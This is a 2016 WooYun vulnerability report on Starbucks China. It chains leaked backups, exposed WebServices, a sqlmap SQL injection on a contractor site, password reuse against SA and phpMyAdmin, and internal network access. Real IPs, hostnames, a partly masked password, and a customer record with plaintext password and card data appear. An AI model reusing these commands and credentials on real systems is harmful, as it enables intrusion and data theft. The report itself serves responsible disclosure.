{"id": 88248, "wybug_id": "wooyun-2016-0208769", "wybug_title": "星巴克中国用户敏感信息遍历漏洞 (从不可能利用到可能)                  ", "wybug_corp": "星巴克", "wybug_author": "猪猪侠", "wybug_date": "2016-05-16 14:49", "wybug_open_date": "2016-06-30 17:20", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-30：\t细节向公众公开  简要描述： 星巴克中国用户敏感信息遍历漏洞 (从不可能利用到可能)本报告通过多个漏洞的组合，进而突破限制，遍历任意用户信息。信息包含用户的：用户名、邮箱、密码、家庭地址、手机号等等（PS：密码是明文的）太标准的东西，墨守成规的东西，往往都容易被预测 详细说明：  #1 漏洞的起因2014年报告了一个星巴克备份文件下载的漏洞，其中包含几项重要的信息 WooYun: 星巴克官网备份可下载导致敏感信息泄露(含操作系统Administrator密码) 两个部署在内网的WebService:\nhttp://172.16.1.32:8002/StarbucksGCService.svc // 星巴克官网后台http://172.16.1.32:8888/Service1.svc // 星巴克处理用户信息的接口\n#2 漏洞发现一直没空关注星巴克的系统，前天去买星冰粽，服务员叫我扫会员卡，手机APP提示我的二维码过期，也就是星巴克的系统进行了一次重大更新，就顺便看了一下；新的服务器架构从 .NET 切换至 PHP，但是服务器却增多了通过扫描 www.starbucks.com.cn  180.153.48.188 网段开放的WEB服务，一个默认页面的信息引起了我的注意。\nhttp://180.153.48.178:803/\n\n\n这不就是上面提到的Service1.svc么？深入研究分析，得知这是一个.NET的WebService，里面存在几个关键方法\npublic string GetCustomer(long CustomerId, out MSR.Model.MSR_Customer oCustomer)    {        GetCustomerRequest inValue = new GetCustomerRequest();        inValue.CustomerId = CustomerId;        GetCustomerResponse retVal = ((IService1)(this)).GetCustomer(inValue);        oCustomer = retVal.oCustomer;        return retVal.GetCustomerResult;    }\n根据客户的ID，获取完整的客户信息，返回的用户信息如下\n\n#3 WebService利用可以直接用Visual Studio生成对应的 .NET  cs 文件\nsvcutil.exe http://180.153.48.178:803/Service1.svc?wsdl\n#4 利用，直接获取customerID 为 2 的用户信息（这里只是测试环境的数据，后面会介绍如何找到真实环境）\n\n#5 进一步挖掘通过访问https://180.153.48.178的页面内容，发现这是今年3月份之前的网站版本\n\n其中有两处地方泄露了另外的WebServicehttps://180.153.48.178/js/hasjs.js\nvar domainMSRURL = 'https://staging.rewards.flipscript.com.cn/';var domainSVCURL = \"http://218.80.216.34:8010/\";var domianWebURL = \"http://218.80.216.34:8012/\";//domainMSRURL = \"http://localhost:49960/MSR/\";\nhttps://180.153.48.178/interface/MSR.ashx\n// JavaScript Document var domainMSRURL = 'http://218.80.216.34:805/'; var domainSVCURL = \"http://218.80.216.34:8010/\"; var domianWebURL = \"http://218.80.216.34:8012/\"; //domainMSRURL = \"http://localhost:49960/MSR/\"; document.write('\n#6 这个服务器上的某个.svc怎么那么眼熟呢？不就是开始提到的StarbucksGCService.svc吗？至此，两个关键的WebService都找到了，还有星巴克的后台\n\n\n\n\n\nService1.svc 有个 GetAdminList的方法，你懂的，查询出所有后台管理员的信息\npublic string GetAdminList(int nPageSize, int nPageIndex, out MSR.Model.MSR_Admin[] oAdminList, out int nCount)    {        GetAdminListRequest inValue = new GetAdminListRequest();        inValue.nPageSize = nPageSize;        inValue.nPageIndex = nPageIndex;        GetAdminListResponse retVal = ((IService1)(this)).GetAdminList(inValue);        oAdminList = retVal.oAdminList;        nCount = retVal.nCount;        return retVal.GetAdminListResult;    }\n\n\n   漏洞证明：  #7 以战养战，信息组合整理一下发型，梳理一下所有信息，得到关键的因素上面所有的信息， 都属于测试环境的，那么接下来就需要突破到真实环境了；关键信息点：从https://180.153.48.178的SSL证书，得知星巴克的系统是外包给flipscript公司开发的，flipscript公司被DeepFocus公司收购了；\n\n#8 从flipscript & DeepFocus下手开启神器，发现http://cn.deepfocus.net一枚注入漏洞\npython sqlmap.py -u \"https://cn.deepfocus.net/tasoap/tasoap.php?key=Fly&id=1\" -p key --dbs\n\navailable databases [20]:                                                                                                                    [*] bugtracker[*] channelx[*] deepfocus[*] dftest[*] dnsw[*] fair[*] ftpusers[*] information_schema[*] mac[*] mmj[*] mysql[*] ra[*] TADB[*] test[*] torres[*] wordpress[*] wx[*] yioulai[*] yioulaisz[*] YOLDB\nmysql是root权限，那就直接root服务器吧, ssh 登录\n\n这台服务器里面有个bug.flipscript.net的Mantis管理工具，刚好证明了和星巴克有关联\n\n发现了一处关键信息\n/** WordPress数据库的名称 */define('DB_NAME', 'wordpress');/** MySQL数据库用户名 */define('DB_USER', 'root');/** MySQL数据库密码 */define('DB_PASSWORD', '*****@05****');/** MySQL主机 */define('DB_HOST', 'localhost');\n#9 峰回路转整理好这些东西，咱们来到www.flipscript.com.cn，配置好神器，字典一挂，扫除了mssql对外开放，SA密码为：MYSQL数据库一样的密码；\n\n#10 有了这些信息之后，就能重新以新的角度来审视星巴克中国了开启神器，发现一个phpmyadmin，用那个从DeepFocus得到的ROOT密码，直接root权限进入\nhttp://cn.chinatimeline.starbucks.com.cn/phpmyadmin/\n\n\n这里又刚好还有一个WordPress: http://chinatimeline.starbucks.com.cn/ ，整点东西证明我来过。http://chinatimeline.starbucks.com.cn/?p=1\n\n#11 通向内网的通行证\n\n/etc/hosts\n127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6172.18.0.187    ntp02.sbuxcf.com ntp02\n/etc/rc.local\n#!/bin/sh## This script will be executed *after* all the other init scripts.# You can put your own initialization stuff in here if you don't# want to do the full Sys V style init stuff.touch /var/lock/subsys/localsh /home/stadmin/ddnsupdate.sh\n/etc/sysconfig/network-scripts/ifcfg-eth0\nHWADDR=00:50:56:88:33:23NAME=eth0GATEWAY=172.16.1.1DNS1=172.18.0.180DOMAIN=172.18.0.180DEVICE=eth0ONBOOT=yesUSERCTL=noBOOTPROTO=staticNETMASK=255.255.254.0IPADDR=172.16.1.43PEERDNS=nocheck_link_down() { return 1; }\n两个部署在内网的WebService，就在这个内网里面，不可能成为了可能\nhttp://172.16.1.32:8002/StarbucksGCService.svc // 星巴克官网后台http://172.16.1.32:8888/Service1.svc // 星巴克处理用户信息的接口\n\nsvcutil.exe http://172.16.1.32:8888/Service1.svc?wsdl\n\n{u'Accept': 1, u'Active': 1, u'Address': u'ss,ssss', u'AddressList': [], u'Answer': u'', u'AreaId': 6, u'AreaName': u'\\u897f\\u5317', u'Birthday': u'1989-02-26T00:00:00', u'CityId': -1, u'CityName': None, u'CountryId': 1, u'CountryName': u'\\u4e2d\\u56fd', u'CreateTime': u'2014-05-27T11:06:00.183', u'CustomerCardList': [{u'CardNo': u'6010581801781836',   u'CardPassword': u'15840030',   u'CreateTime': u'2014-05-23T15:07:55.707',   u'CustomerId': 148,   u'Defalut': 0,   u'Id': 148},  {u'CardNo': u'6010582556865337',   u'CardPassword': u'25535122',   u'CreateTime': u'2014-05-27T11:06:00.197',   u'CustomerId': 148,   u'Defalut': 0,   u'Id': 169}], u'CustomerId': 148, u'CustomerName': u't2556865337', u'CustomerPassword': u'123456', u'Email': u't2556865337@126.com', u'FirstName': u'Ws', u'HomeTel': u'', u'LastName': u'Ws', u'LastUpTime': u'2014-05-30T16:27:03.417', u'Level': 2, u'LoveDrink': u'', u'LoveItem': u' ', u'MMX_CustomerId': 3237670, u'Mobile': u'11111111111', u'MobileAcceptType': 0, u'NewsCustomerName': None, u'News_CustomerPassword': None, u'OtherAcceptType': 0, u'Points': 39, u'PostCode': u'222222', u'ProvinceId': 31, u'ProvinceName': u'\\u65b0\\u7586\\u7ef4\\u543e\\u5c14\\u81ea\\u6cbb\\u533a', u'Question': 0, u'Registered': False, u'Sex': 0, u'Type': 0, u'Version': 0, u'WhyLove': None}\n   修复方案：  #1 安全是一个整体，保证安全不在于强大的地方有多强大，而在于真正薄弱的地方在哪里#2 一个一个的漏洞来补丁#3 太标准的东西，都容易被预测   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-05-16 17:16 厂商回复： 非常感谢您的报告，问题已着手处理。感谢大家对星巴克安全的关注，您也可以直接联系我们的技术团队反馈任何安全问题，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-14 23:07 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:5382 漏洞数:416        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  好久没有折腾这么长的漏洞了    \n     2016-05-14 23:10 |    \t\t我叫肥羊 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:11        | PHP是最好的语言。。。。。)\t\t \n  围观    \n     2016-05-14 23:10 |    \t\tSubmit \t\t\t( 普通白帽子  |\t\t\t        Rank:565 漏洞数:132        | )\t\t \n  星巴克是可以吃的    \n     2016-05-14 23:11 |    \t\t孤狼 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 小白一个，多多学习大老们的技术！！！)\t\t \n  没去吃过      \n     2016-05-14 23:32 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:2794 漏洞数:549        | 我就问，还有谁！！！！！！！！！！！！！...)\t\t \n  猪猪侠牛逼！    \n     2016-05-14 23:34 |    \t\t药尘 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:11        | 对不起，本人受《中国人名共和国未成年人保...)\t\t \n  膜拜  猪猪侠~    \n     2016-05-14 23:38 |    \t\t涵  舐 渊 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 努力进入安全领域)\t\t \n  哦 的向前辈学习学习 ，昨晚还看了您的微博 关于星巴克的漏洞呢 。哈哈     \n     2016-05-14 23:41 |    \t\tTren \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:79        | 怎么才能挖到洞，我说 主要看气质！)\t\t \n  猪猪侠牛逼！    \n     2016-05-15 08:50 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1413 漏洞数:148        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  听上去就牛逼    \n     2016-05-15 09:03 |    \t\tAgony \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:12        | you know a cat has nine lives.)\t\t \n  围观    \n     2016-05-15 09:12 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  围观猪猪侠    \n     2016-05-15 09:14 |    \t\t布 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:37        | 凡人皆有一死)\t\t \n  值得一看~    \n     2016-05-15 10:18 |    \t\twebhe4d \t\t\t( 普通白帽子  |\t\t\t        Rank:143 漏洞数:48        )\t\t \n  灵感来自猪哥每天的大杯美式 ：）    \n     2016-05-15 10:28 |    \t\tBrother \t\t\t( 实习白帽子  |\t\t\t        Rank:78 漏洞数:24        )\t\t \n  我猜到了，喝一口，然后把其余倒在电脑机主上，- -渗透了。    \n     2016-05-15 11:31 |    \t\tDracul \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:9        | ⊙_⊙)\t\t \n  学习，听起来很牛B    \n     2016-05-15 11:39 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:260 漏洞数:64        | http://sec.tuniu.com)\t\t \n  雷了？！    \n     2016-05-15 13:43 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  星巴克看洞    \n     2016-05-15 13:55 |    \t\t啊L川  \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  吊炸天    \n     2016-05-15 14:31 |    \t\t小牛牛 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:17        | 求带)\t\t \n  我了个草。吊炸天啊。。真想看过程    \n     2016-05-15 14:33 |    \t\tphith0n  \t\t\t( 普通白帽子  |\t\t\t        Rank:834 漏洞数:127        | 一个想当文人的黑客~)\t\t \n  经常喝星巴克还能挖漏洞。    \n     2016-05-16 09:32 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:64        | 要想Rank给高，标题一定得屌)\t\t \n  猪哥走到哪日到哪    \n     2016-05-16 10:19 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:552 漏洞数:83        | 潜心学习~~~)\t\t \n  密码是明文的。。。大胆预测是个人页面返回时泄露太多    \n     2016-05-16 11:31 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2016-05-16 14:51 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1659 漏洞数:245        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  星巴克是什么？好吃吗？    \n     2016-05-16 14:51 |    \t\t不能忍 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:63        | 要是能重来，我要选李白!)\t\t \n  刚买了一杯。    \n     2016-05-16 14:58 |    \t\tckaexn \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:9        | ~)\t\t \n  感觉是厂商来认领了    \n     2016-05-16 15:01 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:2794 漏洞数:549        | 我就问，还有谁！！！！！！！！！！！！！...)\t\t \n  厂商来了，哈哈，吓尿了吧    \n     2016-05-16 15:01 |    \t\tFnut \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:28        | 大王叫我来巡山，巡完南山巡北山)\t\t \n  @ckaexn 没错    \n     2016-05-16 15:17 |    \t\t盛大网络(乌云厂商)\t\t \n  猪哥消息蛮灵通啊    \n     2016-05-16 16:12 |    \t\timp0rt \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:54        | 。)\t\t \n  前几天才喝了一杯，然而旧病复发。    \n     2016-05-16 18:11 |    \t\tdr.m1st3r \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:10        | 一个爱泡妞的好骚年。)\t\t \n  喝过咖啡把洞挖-_-#    \n     2016-05-16 19:29 |    \t\t放逐 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 白帽子放逐Gg？得失乐与悲与Av Qq205655539)\t\t \n  前几天才喝了一杯，然而旧病复发。    \n     2016-05-16 20:49 |    \t\tQ1NG \t\t\t( 普通白帽子  |\t\t\t        Rank:148 漏洞数:27        | 临 兵 斗 者 皆 阵 列 前 行 !)\t\t \n  吓得我都想起来了,我从来都还没去过星巴克    \n     2016-05-16 23:06 |    \t\t小逗逼 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | rt)\t\t \n  经常喝星巴克还能挖漏洞    \n     2016-05-25 14:58 |    \t\tExplo1t \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:9        | 流生若川，不要小看人生啊！)\t\t \n  牛逼 膜拜    \n     2016-05-25 23:07 |    \t\t秦风 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:10        | 血染江山的画  怎敌妳眉间一点朱砂  覆...)\t\t \n  路过 膜拜    \n     2016-06-05 18:56 |    \t\tMartial \t\t\t( 普通白帽子  |\t\t\t        Rank:2639 漏洞数:370        | 竟然还有人冒充我，醉了，骗子QQ445697541...)\t\t \n  提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞 ( 可以等待进一步公开或者支付 10 个乌云币提前查看   确定支付并查看 )    \n     2016-06-08 10:34 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1702 漏洞数:241        | 。)\t\t \n  @猪猪侠 猪哥不太懂WebService调用那部分 有学习的东西吗？    \n     2016-06-12 09:28 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:5382 漏洞数:416        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @scanf SOAP，支持XML格式的API    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}